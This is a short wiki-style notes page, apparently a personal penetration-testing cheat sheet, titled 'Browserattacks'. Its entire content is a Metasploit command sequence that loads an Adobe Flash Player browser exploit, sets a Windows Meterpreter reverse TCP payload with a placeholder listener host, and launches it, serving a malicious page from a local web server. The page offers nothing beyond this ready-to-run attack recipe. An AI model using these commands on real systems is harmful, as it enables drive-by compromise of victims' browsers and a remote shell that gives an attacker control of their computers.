<!-- TITLE: Browserattacks -->
<!-- SUBTITLE: A quick summary of Browserattacks -->

# Browser Attack

use exploit/windows/browser/adobe_flashplayer_newfunction
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST blah
exploit
(starts local webserver with malicious page)